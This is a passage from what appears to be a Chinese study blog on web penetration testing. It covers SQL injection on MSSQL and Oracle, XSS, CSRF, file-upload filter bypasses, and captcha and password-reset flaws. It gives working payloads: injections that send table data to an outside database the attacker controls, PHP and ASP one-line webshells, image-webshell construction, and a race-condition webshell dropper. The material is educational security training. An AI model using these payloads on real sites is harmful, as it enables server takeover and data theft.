title="准备工作"></a>准备工作</h3><p>1.我们首先需要一个数据库</p><p>这里有免费可白嫖的平台让你搭建数据库，①.香港云：<a href="http://www.webweb.com" target="_blank" rel="noopener">http://www.webweb.com</a></p><p>②.国外平台：<a href="https://my.gearhost.com/CloudSite" target="_blank" rel="noopener">https://my.gearhost.com/CloudSite</a></p><p>我们注册的时候如果不想使用自己的邮箱验证，可以使用临时邮箱：bccto.me平台来进行邮箱验证</p><p>这样我们就得到了我们自己的数据库地址、数据库名、用户名、密码</p><p>2.然后我们需要用Navicat连接我们的数据库，黄色代表连接成功</p><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="判断是否只存在注入"><a href="#判断是否只存在注入" class="headerlink" title="判断是否只存在注入"></a>判断是否只存在注入</h4><p>用and 1=1 – qwe和and 1=2 – qwe</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL1.png" alt="MSSQL1"></p><p>显示正常</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL2.png" alt="MSSQL2"></p><p>显示不正常</p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><pre><code>' order by 1 -- qwe            #显示正常' order by 2 -- qwe            #显示正常' order by 3 -- qwe            #显示正常' order by 4 -- qwe            #报错</code></pre><p>判断出来有三个字段获取id和表名</p><h4 id="获取id和表名"><a href="#获取id和表名" class="headerlink" title="获取id和表名"></a>获取id和表名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxx;database=samedi').samedi.dbo.object select id,name from sysobjects where xtype='U' --+</code></pre><p>注入上面的语句我们就可以获得表名</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL3.png" alt="MSSQL3"></p><p>admin表对应的id为“1977058079”</p><h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxxx;database=samedi').samedi.dbo.columns select name from syscolumns where id=1977058079 --+</code></pre><p>通过id,我们可以找到admin表对应的字段，创建另一个只有一个字段的表columns，当然，也可以用之前的那个表。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL4.png" alt="MSSQL4"></p><p>之后获取字段中的数据也是轻而易举的了，因为知道了有4个字段，所以我们在自己的数据库中创建一个有4个字段的表</p><pre><code>select *from admin --+</code></pre><h2 id="Oracle注入——报错注入"><a href="#Oracle注入——报错注入" class="headerlink" title="Oracle注入——报错注入"></a>Oracle注入——报错注入</h2><p>MySQL中的报错注入使用的函数是updatexml()</p><p>Oracle数据库中存在虚表/实表，Oracle弱化了库的概念，强化了用户的概念，用户就是库</p><h3 id="系统自带库"><a href="#系统自带库" class="headerlink" title="系统自带库"></a>系统自带库</h3><pre><code>select * from all_tables                #列出所有表select * from user_tables                #查询出当前用户的表select * from all_tab_columns            #查询出所有字段select * from user_tab_coulumns            #查询出当前用户的字段select * from v$version                    #查版本</code></pre><h3 id="limit的使用"><a href="#limit的使用" class="headerlink" title="limit的使用"></a>limit的使用</h3><p>Oracle用的是rownum=1：限制查询返回的总行数为一条，且大于1时，只能用小于号，例：</p><pre><code>select * from admin where rownum=1        #一条数据select * from admin where rownum&lt;3        #两条数据</code></pre><p>select rownum,UNAME from admin</p><table><thead><tr><th>ROWNUM</th><th>UNAME</th></tr></thead><tbody><tr><td>1</td><td>admin</td></tr><tr><td>2</td><td>root</td></tr></tbody></table><h3 id="Oracle显错注入"><a href="#Oracle显错注入" class="headerlink" title="Oracle显错注入"></a>Oracle显错注入</h3><pre><code>and 1=1and 1=2order by 1··union select null,null,null from  dual我们是需要知道null的字段类型，从而来代替null的，这里假如知道union select 1,null,to_nchar('a') from dual这里需要将union前面的语句显示不出来，比如说将id字段输入一个不存在的数字，例：1000id=1000 union all select 1,null,to_nchar('table_name') from user_tables查出来表名为xxxid=1000 union all select 1,null,to_nchar('table_name') from user_tables where table_name&lt;&gt;'xxx'这句相当于将xxx排除，因此可以得到其他表名，例：ADMIN还想获得下一个表名就在这句后面加上and table_name&lt;&gt;'ADMIN'select username from (select rownum r,username from all_users) where r=1r相当于rownum的别名，r=2就是第2条数据select column_name from(select rownum r,column_name from user_tab_columns) where r=1id=1000 union all select 1,null,to_nchar(column_name) from (select rownum r,column_name from user_tab_columns where table_name='ADMIN') where r=1select 1,null,to_char(UPASS) from (select rownum r,UPASS from admin) where r=1</code></pre><h3 id="Oracle报错注入"><a href="#Oracle报错注入" class="headerlink" title="Oracle报错注入"></a>Oracle报错注入</h3><p>CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))</p><p>：去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误，从而爆出查询内容）</p><pre><code>id=1000 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_tables where rownum=1))</code></pre><p>报错不需要union，之后的跟显错注入是一样的。</p><h2 id="XSS原理分析与解剖"><a href="#XSS原理分析与解剖" class="headerlink" title="XSS原理分析与解剖"></a>XSS原理分析与解剖</h2><p>如果我们想进入管理员后台？</p><p>1.找后台地址，输入正确的账号密码</p><p>2.通过cookie，不用账号密码</p><p>Cookie是以分号结尾的，第一个等号的后面都是值</p><p>XSS最大的作用就是窃取Cookie，Cookie是存放在用户的浏览器中的</p><br><p>XSS也是注入的一种：前段注入</p><p>XSS可以：窃取Cookie（用的最频繁）、获取内网ip、获取浏览器中保存的明文密码、截取网页屏幕、网页上的键盘记录</p><p>XSS分类：</p><p>​    反射型：你提交的数据成功的实现了XSS，不会放入数据库中，但是仅仅是对你这次访问产生了影响，是非持久型攻击；</p><p>​    存储型：你提交的数据成功的实现了XSS，存入了数据库中，别人访问这个页面的时候就会自动触发；</p><p>​    DOM型：完全是客户机的事情，与前端交互。</p><h3 id="我们与网站之间的交互是怎样的？"><a href="#我们与网站之间的交互是怎样的？" class="headerlink" title="我们与网站之间的交互是怎样的？"></a>我们与网站之间的交互是怎样的？</h3><p>请求网站，网站返回前端代码，浏览器根据前端代码解析执行，渲染出好看的页面</p><p>PHP是服务器执行的，前端代码是被浏览器执行的。</p><h3 id="怎么测试网站是否存在XSS？"><a href="#怎么测试网站是否存在XSS？" class="headerlink" title="怎么测试网站是否存在XSS？"></a>怎么测试网站是否存在XSS？</h3><p>三种触发方法：</p><h4 id="标签触发"><a href="#标签触发" class="headerlink" title="标签触发"></a>标签触发</h4><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>弹窗使用来证明是否存在XSS的，但是弹窗危害有些大，尽量避免使用，可以使用其他的html代码来证明是否被当做html代码执行了</p><p>在真正的项目上，还是要用弹窗来证明是否存在XSS，或直接打攻击代码窃取Cookie</p><h4 id="伪协议触发"><a href="#伪协议触发" class="headerlink" title="伪协议触发"></a>伪协议触发</h4><pre><code>JavaScript：alert(123)</code></pre><p>上面的JavaScript就是伪协议，后面的东西就会被当做js代码执行，需要点击触发，例</p><pre><code>&lt;a href="Javascript:alert(123)"&gt;abc&lt;/a&gt;</code></pre><h4 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h4><p>满足某种条件自动触发，例</p><pre><code>&lt;img src="#" onerror=alert(1) //&gt;</code></pre><p>当此图片没有加载成功的时候会触发弹窗</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>在什么情况下双引号能够替代单引号？</p><p>1、本身就是单引号闭合，但是页面上因为浏览器渲染看着是双引号闭合</p><p>2、就没写单引号闭合</p><h3 id="存储型XSS会出现在什么地方？"><a href="#存储型XSS会出现在什么地方？" class="headerlink" title="存储型XSS会出现在什么地方？"></a>存储型XSS会出现在什么地方？</h3><p>任何可能插入数据库的地方</p><p>但是数据不一定存储在数据库中，如日志、文件</p><p>也不是只有框才会交互，数据传参要用GET、POST、HEAD，并不一定要有框，所以见框就插是一种方法，但并不唯一</p><p><strong>用户的输入，一般控制的很严格；</strong></p><p><strong>系统的获取，一般控制的不严格</strong></p><h2 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h2><p>通过js对网页进行修改的就是DOM型XSS</p><p>DOM是一个与平台、编程语言无关的接口，他允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为系那是页面的一部分。</p><p>DOM——based XSS漏洞是基于文档对象模型（Document Object Model，DOM）的一种漏洞</p><p>DOM中有很多对象，其中一些使用户可以操纵的，如url，location，refelTer等。</p><p>客户端的脚本程序可以通过DOM动态的检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM——based XSS漏洞。</p><br><p>每个载入浏览器的HTML文档都会成为Document对象，Document对象使我们可以从脚本中对HTML页面中的所有元素进行访问。</p><p>Document对象属性</p><table><thead><tr><th>属性</th><th align="left">描述</th></tr></thead><tbody><tr><td>body</td><td align="left">提供对&lt;body&gt;元素的直接访问。对于定义了框架集的文档，改属性引用最外层的&lt;frameset&gt;。</td></tr><tr><td>cookie</td><td align="left">设置或返回与当前文档有关的所有cookie。</td></tr><tr><td>domain</td><td align="left">返回当前文档的域名。</td></tr><tr><td>lastModified</td><td align="left">返回文档被最后修改的日期和时间。</td></tr><tr><td>referrer</td><td align="left">返回载入当前文档的文档的URL。</td></tr><tr><td>title</td><td align="left">返回当前文档的标题。</td></tr><tr><td>URL</td><td align="left">返回当前文档的URL</td></tr></tbody></table><p>document.cookie     可以读取cookie</p><p>JS 存在的意义就是让更多的工作在访问者自己的电脑中去处理，从而降低对服务器资源的占用</p><p>用document.lastModified  可以返回时间</p><p>静态页面所返回的时间是不变的，伪静态页面所返回的时间是变化的</p><p><strong>动态和伪静态页面漏洞相较于静态页面会更多</strong></p><p>Document对象方法</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>close()</td><td>关闭用document.open()方法打开的输出流，并显示选定的数据。</td></tr><tr><td>getElementById()</td><td>返回对拥有指定id的第一个对象的引用。</td></tr><tr><td>getElementsByName()</td><td>返回带有指定名称的对象集合。</td></tr><tr><td>getElementByTagName()</td><td>返回带有指定标签名的对象集合。</td></tr><tr><td>open()</td><td>打开一个流，以收集来自任何document.write()或document.writeln()方法的输出。</td></tr><tr><td>write()</td><td>向文档写HTML 表达式或JavaScript代码。</td></tr><tr><td>writeln()</td><td>等同于write()方法，不同的是在每个表达式之后写一个换行符。</td></tr></tbody></table><p>document.write()        他可以接受native编码值</p><p><strong>JS触发的XSS就是DOM型XSS，是前端产生了问题</strong></p><h2 id="跨站请求伪造——CSRF"><a href="#跨站请求伪造——CSRF" class="headerlink" title="跨站请求伪造——CSRF"></a>跨站请求伪造——CSRF</h2><p>CSRF：借用你的Cookie；XSS：窃取你的Cookie</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当访问了一个有CSRF的网站，同时又访问了一个之前登陆过的网站，这时，这个登陆过的网站中的你的账号内的有些东西会被更改。</p><p>CSRF（Cross-site request forgery）跨站请求伪造：也被称为“One Click Attack”或者“Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的新人用户，而CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p><p>其实说白了，CSRF漏洞的成因就是网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想的功能（比如是添加账号等）。</p><p>CSRF核心在于缺乏验证</p><p>1、像验证码是他做好的方法，但开发不可能给每一个步骤都添加验证码，因为那样用户体验感极差；</p><p>2、开发为了安全，设置了一个东西叫做Token，Token是一种验证机制，每个请求的表单中都存在着一个Token字段</p><br><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>现在A站创建一个用户，并修改它的个人资料，在那个A站想要改其内容的页面用burp抓一个包，然后右键-&gt;Engagemant tools-&gt;GGenerate CSRF POC</p><p>将产生的html代码保存在一个html文件中，此代码即为攻击代码</p><p>再注册另一个账号，然后打开那个保存在本地上的攻击页面，点击按钮，然后刷新第二个站好的个人资料页面，发现内容变了，那么这个地方就存在CSRF漏洞。</p><p>也可以设置自动触发：将攻击页面的那个按钮里的</p><form></form>以及内容删掉，然后在函数后的一行<script>与</script>内加上一行submitReques()，也就是直接运行这个函数。<p></p><h2 id="文件上传漏洞——解析、验证、伪造（一）（黑名单）"><a href="#文件上传漏洞——解析、验证、伪造（一）（黑名单）" class="headerlink" title="文件上传漏洞——解析、验证、伪造（一）（黑名单）"></a>文件上传漏洞——解析、验证、伪造（一）（黑名单）</h2><p>首先讲一下各种shell的含义：</p><p>webshell：网站权限</p><p>getshell：获取权限</p><p>反弹shell：受害及其会访问攻击机</p><p>正常shell：攻击机连接木马</p><br><p>PHP常用的一句话木马：</p><pre><code>&lt;?php eval($_REQUEST['a'])?&gt;</code></pre><br><p>webshell管理工具有:</p><p>中国菜刀、蚁剑、冰蝎等</p><br><p>数据库一般是外界访问不到的，所以密码一般都不会改</p><p>正常黑客思维：</p><p>我就是要拿权限，怎么拿不重要，大部分思路-&gt;SQL注入，获得密码，进入后台，上传文件，有的时候，前台上传一句话木马拿下服务器也是常见的。</p><p>黑白名单机制：</p><p>黑名单：不允许上传什么</p><p>白名单：只允许上传什么</p><p>白名单相比于黑名单更安全</p><h3 id="上传遇到的情况："><a href="#上传遇到的情况：" class="headerlink" title="上传遇到的情况："></a>上传遇到的情况：</h3><p>前端检测的情况：一般是在网页上写一段JS代码，用Js去检测，验证上传文件的后缀名，有白名单也有和名单</p><p>判断方法：在浏览加载文件，但未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来判断，如果弹出不允许上传，但是没有抓到数据包，那么就是前端验证</p><p>前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过</p><br><p>服务端检测的情况：</p><p>常见手段：检查Content-Type（内容类型）、检查后缀（检查后缀是主流）、检查文件头</p><p>如何绕过Content-Type和文件头检测，这个时候我们就要去制作一个图片马了；</p><h4 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h4><p>图片马制作很简单，写一个一句话木马放在TXT文件，然后找一张你喜欢的图片（注意文件大小，越小越好），然后打开cmd</p><pre><code>copy a.jpg/b+1.txt 123.jpg        (将a.jpg和1.txt合并为123.jpg)</code></pre><p>图片马可以很好的绕过内容类型和文件头</p><p>/b的意思是将它以二进制的方法去合并，为了防止图片破碎</p><h4 id="判断黑白名单"><a href="#判断黑白名单" class="headerlink" title="判断黑白名单"></a>判断黑白名单</h4><p>上传一个2.a文件，若能上传就是黑名单机制</p><h3 id="上传绕过方法："><a href="#上传绕过方法：" class="headerlink" title="上传绕过方法："></a>上传绕过方法：</h3><h4 id="1、最不可靠的前端验证"><a href="#1、最不可靠的前端验证" class="headerlink" title="1、最不可靠的前端验证"></a>1、最不可靠的前端验证</h4><p>直接抓包，将上传的jpg改为php即可</p><h4 id="2、Content-Type绕过"><a href="#2、Content-Type绕过" class="headerlink" title="2、Content-Type绕过"></a>2、Content-Type绕过</h4><p>既然是检查文件类型，拿出我们的图片马，web容器是根据后缀来识别格式的，我只要上传的文件后缀是.php就行</p><h4 id="3、黑名单绕过"><a href="#3、黑名单绕过" class="headerlink" title="3、黑名单绕过"></a>3、黑名单绕过</h4><p>如果.php无法上传，那我们就尝试.php3、.php4、.php5、.phtml，这些默认都会被解析为php的</p><h4 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a>4、.htaccess文件绕过</h4><p>.htaccess是什么？</p><p>全称是Hypertext Access(超文本入口)，.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。</p><p>.htaccess功能：</p><p>文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表</p><p><strong>很可以，这么一个强大的功能默认是不开启的</strong></p><p>写一个文件1.txt，内容为</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>这个指令代表着.jpg文件会被当做php来解析，重命名这个文件为.htaccess</p><pre><code>ren 1.txt .htaccess</code></pre><p>上传图片马之后再上传.htaccess文件，图片马便会被解析</p><h4 id="5、大小写绕过"><a href="#5、大小写绕过" class="headerlink" title="5、大小写绕过"></a>5、大小写绕过</h4><p>我们可以通过大小写去绕过，web容器除非非常老的版本，不然都不区分大小写</p><p>例：PHp</p><h4 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h4><p>在文件名后面留一个空格，然后上传上去后空格会被自动的省略，添加空格是在burp中进行的。</p><h4 id="7、文件后缀（点）绕过"><a href="#7、文件后缀（点）绕过" class="headerlink" title="7、文件后缀（点）绕过"></a>7、文件后缀（点）绕过</h4><p>windows有一个特性，会自动去掉后缀名最后的.</p><h4 id="8、-DATA（Windows文件流绕过）"><a href="#8、-DATA（Windows文件流绕过）" class="headerlink" title="8、::$DATA（Windows文件流绕过）"></a>8、::$DATA（Windows文件流绕过）</h4><p>这里利用了NTFS交换数据流（ADS），ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。</p><p>我们肯定不太懂这什么意思，我们现在cmd运行一个</p><pre><code>echo abcd&gt;&gt;a.txt:b.txt</code></pre><p>​    将abcd写入到a.txt:b.txt中，很明显会生成一个a.txt，但是我们打开a.txt却什么都没发现，我们要编辑就要</p><pre><code>notepad a.txt:b.txt</code></pre><p>我们用dir  /R 就可以看到a.txt:b.txt</p><p>我们饶过，就在burp中将文件名改为1.php::$DATA即可</p><h4 id="9、用php-空-绕过"><a href="#9、用php-空-绕过" class="headerlink" title="9、用php.空.绕过"></a>9、用php.空.绕过</h4><p>因为判断代码可能只去掉结尾的点</p><h4 id="10、pphphp绕过"><a href="#10、pphphp绕过" class="headerlink" title="10、pphphp绕过"></a>10、pphphp绕过</h4><p>若遇到黑名单中出现的字符串都会被变成空值，那么就用pphphp绕过，其原理就是缺乏二次校验</p><h2 id="文件上传漏洞——解析、验证、伪造（二）（白名单）"><a href="#文件上传漏洞——解析、验证、伪造（二）（白名单）" class="headerlink" title="文件上传漏洞——解析、验证、伪造（二）（白名单）"></a>文件上传漏洞——解析、验证、伪造（二）（白名单）</h2><h3 id="00截断和00截断"><a href="#00截断和00截断" class="headerlink" title="%00截断和00截断"></a>%00截断和00截断</h3><p>了解%00实际上我们要先了解0x00，0x00实际上是一个十六进制表示方法，实际上就是表示ascii码值为0，有些函数在处理这些字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了</p><p>这有什么用呢？</p><p>在文件上传时，如果遇到了白名单机制只允许上传jpg后缀的，在没有解析漏洞的情况下我们该怎么办？</p><p>jpg格式并不会被解析，那么我们需要绕过上传过滤。</p><p>假如我们写了1.php%00.jpg传参之后，这些过滤都是直接匹配字符串，他强行匹配到了结尾是.jpg，然后允许上传，但是php的函数去执行的时候他读取到0x00认为结束了，那么这个文件就变成了1.php</p><p>%00实际上和00截断是一模一样的原理，只不过%00是经过URL编码的，%00编码后就是0x00阶段的那个字符</p><h3 id="上传绕过方法：-1"><a href="#上传绕过方法：-1" class="headerlink" title="上传绕过方法："></a>上传绕过方法：</h3><h4 id="1、-00截断绕过"><a href="#1、-00截断绕过" class="headerlink" title="1、%00截断绕过"></a>1、%00截断绕过</h4><p>上传图片马123.jpg，burp抓包，在第一行有save_path=../upload</p><p>在他后面加上/1.php%00，查看我们上传的图片的时候把url栏中的1.php后面的删掉就可以传参或者连菜刀了</p><h4 id="2、00截断绕过"><a href="#2、00截断绕过" class="headerlink" title="2、00截断绕过"></a>2、00截断绕过</h4><p>%00是一个url编码后的结果，其实url编码就是显示16进制，0x代表16进制，%也代表16进制</p><p>burp抓包发现中的../upload，那么在后面加上/1.phpa，然后在hex模式下找到这个a，a的ascii码为61，把他的hex改为00即可</p><h4 id="3、二次渲染绕过"><a href="#3、二次渲染绕过" class="headerlink" title="3、二次渲染绕过"></a>3、二次渲染绕过</h4><p>二次渲染会让你的图片马内的一句话木马变成其他的东西，然后图片马就失效了</p><p>这里通过gif图片绕过，因为二次渲染后的gif图片，文件内容有一部分是不会被改动的</p><p>那么我们就可以在gif图片不变的这部分中写上一句话木马&lt;?php eval($_REQUEST[‘a’])?&gt;</p><p>若木马正常，但还是用不了这个木马，那就要配合其它漏洞，如文件包含解析漏洞</p><h4 id="4、条件竞争"><a href="#4、条件竞争" class="headerlink" title="4、条件竞争"></a>4、条件竞争</h4><p>核心：</p><p>先检测还是先上传 ；</p><p>先上传，再检测，删除；</p><br><p>无论是什么电脑服务器，运算肯定要时间，若我们足够快的话，能不能做到，当文件上传还在检测的时候，就访问到木马</p><p>php有函数能写文件，当访问到的时候写文件函数运行了，及时我们上传的图片马被删除了，喜闻见函数也已经写入了一个文件，就可以用这个新的木马文件</p><p>file_put_contents()：把一个字符串写入文件中</p><p>我们可以构造这样一条语句</p><pre><code>&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[1])?&gt;'); ?&gt;</code></pre><p>上传一个图片马，然后打开查看图片的页面，改url栏为</p><pre><code>/upload/1.php?a=&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[1])?&gt;'); ?&gt;</code></pre><p>这个是访问包，同时我们再次上传一个图片马，再上传过程中抓取上传包</p><p>在上传包中，将1.jpg改为1.php，然后随便选一个要跑的地方，payload type改为NUll Payloads，次数为10000次，Options中Number of Threads为15就可以了</p><p>访问包跟上面一样，访问的options为30比较好，访问的比上传快一些，比较容易成功</p><p>然后两遍同时开始跑包，当生成新木马之后就可以访问连接了</p><h2 id="文件上传解析漏洞（三）"><a href="#文件上传解析漏洞（三）" class="headerlink" title="文件上传解析漏洞（三）"></a>文件上传解析漏洞（三）</h2><p>如果某站点，你上传了PHP没有用或者无法上传的时候，是不是可以尝试下其他的脚本语言；</p><p>IIS一般来说是默认都支持ASP的；</p><p>对于网站来说，文件是怎么处理的是由后缀决定的；</p><h3 id="IIS6-0畸形解析漏洞一"><a href="#IIS6-0畸形解析漏洞一" class="headerlink" title="IIS6.0畸形解析漏洞一"></a>IIS6.0畸形解析漏洞一</h3><p>asa、cer、cdx都会被当做asp解析【这个是一个默认的设置】</p><p>我们上传asp图片马</p><pre><code>&lt;%eval request("a")%&gt;</code></pre><p>用burp将后缀改为asa，将文件存储地址复制下来然后去访问，可以用?a=a()，看是否报错来判断木马是否有效，当然用菜刀连更直接</p><h3 id="IIS6-0解析漏洞二"><a href="#IIS6-0解析漏洞二" class="headerlink" title="IIS6.0解析漏洞二"></a>IIS6.0解析漏洞二</h3><p>x.asp;.jpg</p><p>IIS会认为这是一个asp文件来解析，分号相当于结束</p><p>IIS5.1和7.5均无此漏洞</p><h3 id="IIS6-0解析漏洞三"><a href="#IIS6-0解析漏洞三" class="headerlink" title="IIS6.0解析漏洞三"></a>IIS6.0解析漏洞三</h3><p>在IIS6.0中，文件夹名若是x.asp，那么这个文件夹下任意文件都会被当做asp来执行</p><p>FCK编辑器或者是后台，有很多功能-&gt;可移动文件，可创建目录</p><p>IIS7.5及以上的，若没有关闭报错的话，会爆出他的绝对路径</p><h3 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h3><p>上传php图片马之后，查看图片，url后加上/.php图片就会被解析进而可以传参</p><p>这就是CGI解析漏洞</p><p>适用范围：PHP（只有PHP能用）</p><p>中间件任意：IIS7.5  Nginx这些</p><h4 id="如何判断此漏洞是否存在？"><a href="#如何判断此漏洞是否存在？" class="headerlink" title="如何判断此漏洞是否存在？"></a>如何判断此漏洞是否存在？</h4><p>打开这个网站中的某张图片，然后/.php，如果乱码了，则存在CGI解析漏洞，找到上传点就可以撸掉</p><h3 id="文件上传的目的是为了什么？"><a href="#文件上传的目的是为了什么？" class="headerlink" title="文件上传的目的是为了什么？"></a>文件上传的目的是为了什么？</h3><p>就是为了上传的文件可以任意代码执行，达到对目标的控制，也就是getshell</p><p>getshell的方法有很多，不止有上传文件</p><p>例：</p><p>1、备份数据库，修改数据库名，在老CMS里，备份文件的名字可以自定义，数据库里写一个小马的数据，然后备份文件名改为xxx.asp就可以解析</p><p>2、后台功能强大，可以新建文件；</p><p>有些编辑器，他们可以改变上传文件类型的配置，若拥有执行SQL语句的能力，可以用</p><pre><code>select 1 into dump file 'C:/1.txt'</code></pre><h2 id="验证码绕过、密码找回漏洞"><a href="#验证码绕过、密码找回漏洞" class="headerlink" title="验证码绕过、密码找回漏洞"></a>验证码绕过、密码找回漏洞</h2><p>逻辑漏洞：它的问题不存在于代码，而是开发者逻辑的问题</p><p>第一种验证码，是一种区分用户是计算机 还是认得公共全自动程序；</p><p>可以防止：恶意破解密码、刷票、论坛灌水、有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断地登录尝试，实际上用验证码是现在很多网站通行的方法，我们利用比较简易的方法实现了这个功能；</p><p>这个问题可以由计算机生成评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p><p>第二种验证码就是证明你身份的验证码，如：邮箱验证码、短信验证码</p><h3 id="验证码绕过的常见姿势"><a href="#验证码绕过的常见姿势" class="headerlink" title="验证码绕过的常见姿势"></a>验证码绕过的常见姿势</h3><p>一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据，反正也没有验证码的阻碍；</p><p>二、验证码设置了但是没有效验，乱输验证码也能够成功的登录（估计是老板没给开发工资吧）；</p><p>三、验证码可以重复使用，比如现在的验证码是1111，然后虽然你登录失败后验证吗会变，但是你输入1111他却判定你验证码正确（常见）<a href="https://www.uedbox.com/post/14207/" target="_blank" rel="noopener">https://www.uedbox.com/post/14207/</a></p><p>四、验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123。</p><p>yzm验证码参数，但是我们如果去掉yzm的传参我们就可以让过验证码机制，直接传参user=admin&amp;password=admin，验证码就失效了 <a href="https://www.uedbox.com/post/22266/" target="_blank" rel="noopener">https://www.uedbox.com/post/22266/</a></p><p>五、验证码干扰过低，轻松使用脚本识别<a href="https://www.uedbox.com/post/10085/" target="_blank" rel="noopener">https://www.uedbox.com/post/10085/</a></p><p>六、验证码会在HTML页面输出。<a href="https://www.uedbox.com/post/16869" target="_blank" rel="noopener">https://www.uedbox.com/post/16869</a></p><p>七、验证码可控制，比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定下来，那么验证码可控制<a href="https://www.uedbox.com/post/29913" target="_blank" rel="noopener">https://www.uedbox.com/post/29913</a></p><p>八、验证码有规则，比如是时间戳的后6位（rand函数进行随机数）</p><p>九、有万能验证码，验证码无论是是什么，只要输入万能验证码就可以直接绕过</p><p>十、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数</p><p>十一、图片验证码，类型太少，容易识别<a href="https://www.uedbox.com/post/24112" target="_blank" rel="noopener">https://www.uedbox.com/post/24112</a></p><p>多次登录之后才出现验证码绕过：</p><p>基于session：<a href="https://www.uedbox.com/post/22043" target="_blank" rel="noopener">https://www.uedbox.com/post/22043</a></p><p>基于ip：<a href="https://www.uedbox.com/post/28442" target="_blank" rel="noopener">https://www.uedbox.com/post/28442</a></p><p>基于用户：爆破用户名，而非爆破密码</p><p><strong>验证码绕过只有登录成功它才是一个漏洞</strong></p><br><h3 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h3><p>第一种就是找回密码，往邮箱发送明文或密文的面膜或者验证码（手机短信验证就是往你手机号码发送验证码）通过这样的方法来判断是否是本人</p><p>第二种发送一个重置密码的链接到邮箱</p><p>上述的面膜找回方法会有什么样的漏洞呢？</p><p>1、验证码发送后前端返回<a href="https://www.uedbox.com/post/13890" target="_blank" rel="noopener">https://www.uedbox.com/post/13890</a></p><p>2、验证码无数次限制可爆破<a href="https://www.uedbox.com/post/15675" target="_blank" rel="noopener">https://www.uedbox.com/post/15675</a></p><p>3、验证码可控<a href="https://www.uedbox.com/post/26992" target="_blank" rel="noopener">https://www.uedbox.com/post/26992</a></p><p>4、直接修改密码页面<a href="https://www.uedbox.com/post/35739" target="_blank" rel="noopener">https://www.uedbox.com/post/35739</a></p><p>5、越权漏洞–&gt;自己验证码通过改包然后修改他们密码</p><p><a href="https://www.uedbox.com/post/24098/" target="_blank" rel="noopener">https://www.uedbox.com/post/24098/</a></p><p><a 